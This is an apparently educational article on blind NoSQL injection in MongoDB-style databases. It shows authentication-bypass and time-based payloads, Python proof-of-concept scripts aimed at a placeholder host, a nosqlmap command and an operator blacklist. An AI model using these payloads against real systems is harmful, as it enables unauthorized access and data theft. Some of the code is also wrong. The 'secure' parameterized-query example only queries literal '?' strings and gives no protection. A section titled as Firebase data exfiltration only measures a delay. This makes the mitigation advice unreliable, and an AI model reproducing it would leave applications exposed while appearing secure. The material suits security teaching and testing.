# Blind SQL Injection (BSQLi) in NoSQL and Modern Databases: A Red Teaming Perspective

## Table of Contents
- [Awareness](#awareness)
  - [Introduction to NoSQL Databases](#introduction-to-nosql-databases)
  - [The Myth of NoSQL Injection Immunity](#the-myth-of-nosql-injection-immunity)
  - [Real-World Cases](#real-world-cases)
- [Comprehension](#comprehension)
  - [Understanding Blind NoSQL Injection](#understanding-blind-nosql-injection)
  - [Types of Blind NoSQL Injection](#types-of-blind-nosql-injection)
  - [Example Attack Scenario](#example-attack-scenario)
- [Conviction](#conviction)
  - [Case Studies and Proof of Concept (PoC)](#case-studies-and-proof-of-concept-poc)
  - [Why This Matters](#why-this-matters)
- [Action](#action)
  - [Mitigation Strategies](#mitigation-strategies)
  - [Red Teaming Techniques](#red-teaming-techniques-for-testing-nosql-bsqli)
  - [Future of NoSQL Security](#future-of-nosql-security)

## Awareness

### Introduction to NoSQL Databases
NoSQL databases have gained popularity due to their scalability, flexibility, and schema-free nature. Common NoSQL databases include MongoDB, CouchDB, Firebase, and Cassandra.

```
+-------------------+
|   NoSQL Database |
+-------------------+
| Key-Value Stores |
| Document Stores  |
| Column Stores    |
| Graph Databases  |
+-------------------+
```

### The Myth of NoSQL Injection Immunity
Many developers assume NoSQL databases are immune to SQL Injection attacks because they do not use traditional SQL queries. However, injection vulnerabilities still exist, especially **Blind NoSQL Injection (BSQLi)**.

### Real-World Cases
- **2019 MongoDB Ransom Attacks** – Attackers exploited unsecured NoSQL instances.
- **Firebase Exploits** – Researchers found security flaws allowing unauthorized access.

## Comprehension

### Understanding Blind NoSQL Injection
Blind NoSQL Injection occurs when an attacker interacts with a NoSQL database in a way that does not return direct error messages. Instead, the attacker deduces information through **Boolean logic, time delays, or Out-of-Band (OOB) techniques**.

```
User Input  ---> Application  ---> Database Query
      |                        |
      |                        V
      +----> Blind Injection ---> Information Leak
```

### Types of Blind NoSQL Injection
- **Boolean-Based Blind NoSQL Injection** – The attacker sends queries that return true or false responses, helping to infer database behavior.
- **Time-Based Blind NoSQL Injection** – By measuring the response time of specific queries, attackers can extract data without direct feedback.
- **Out-of-Band (OOB) Blind NoSQL Injection** – Exploiting NoSQL engines that process external interactions, such as DNS or HTTP requests, to exfiltrate data.

### Example Attack Scenario
#### 1. Boolean-Based Injection
Consider a web application using MongoDB:

```javascript
user = db.users.findOne({"username": userInput, "password": passInput});
```

If the input is not sanitized, an attacker might inject:

```javascript
{"username": {"$ne": null}, "password": {"$ne": null}}
```

This bypasses authentication by always returning a valid user object.

#### 2. Time-Based Injection
If the database executes different queries based on conditional logic, an attacker can measure time delays to extract information:

```javascript
{"username": "admin", "$where": "sleep(5000)"}
```

A delay in response time indicates that the query successfully manipulated the backend logic.

```
Query Sent  ---> No Immediate Response  ---> Delay Observed  ---> Data Extracted
```

## Conviction

### Case Studies and Proof of Concept (PoC)
#### Extracting Admin Credentials via Boolean-Based Injection
```python
import requests

url = "http://target.com/login"
username_payload = {"username": {"$ne": None}, "password": {"$ne": None}}
response = requests.post(url, json=username_payload)

if response.status_code == 200:
    print("Possible NoSQL Injection vulnerability detected!")
```

#### Firebase Data Exfiltration via Time-Based Injection
```python
import time
import requests

url = "http://target.com/api/user"
payload = {"username": "admin", "$where": "sleep(5000)"}
start = time.time()
requests.post(url, json=payload)
end = time.time()

if end - start > 5:
    print("Time-based NoSQL Injection detected!")
```

### Why This Matters?
Blind NoSQL Injection can lead to:
- **Data breaches**
- **Privilege escalation**
- **Complete application compromise**

## Action

### Mitigation Strategies
#### Using Parameterized Queries
```python
import pymongo
from pymongo import MongoClient

client = MongoClient("mongodb://localhost:27017/")
db = client["testdb"]

# Secure way to handle user input
query = {"username": "?", "password": "?"}
result = db.users.find_one(query)
```

#### Input Validation
```python
def sanitize_input(user_input):
    blacklist = ["$ne", "$where", "$gt", "$lt", "$regex"]
    for keyword in blacklist:
        if keyword in user_input:
            raise ValueError("Potential NoSQL Injection detected!")
    return user_input

# Example Usage
try:
    user_input = sanitize_input("$ne: null")
except ValueError as e:
    print(e)
```

#### Access Control
```javascript
// In MongoDB, restrict user privileges
{
  "roles": [
    {
      "role": "read",
      "db": "testdb"
    }
  ]
}
```

### Red Teaming Techniques for Testing NoSQL BSQLi
#### Automated Scanners
```bash
nosqlmap -u "http://target.com/login"
```

#### Manual Payload Testing
```javascript
{"username": {"$regex": "^admin"}, "password": {"$ne": null}}
```

#### Logging and Monitoring
```python
import logging

logging.basicConfig(filename='nosql_injection.log', level=logging.WARNING)

def log_attempt(payload):
    logging.warning(f"Possible NoSQL Injection Attempt: {payload}")
```

### Future of NoSQL Security
With the rise of NoSQL databases, developers and red teams must adapt security measures to prevent evolving injection attacks. Investing in proactive security testing and secure coding practices is essential to mitigating these threats.
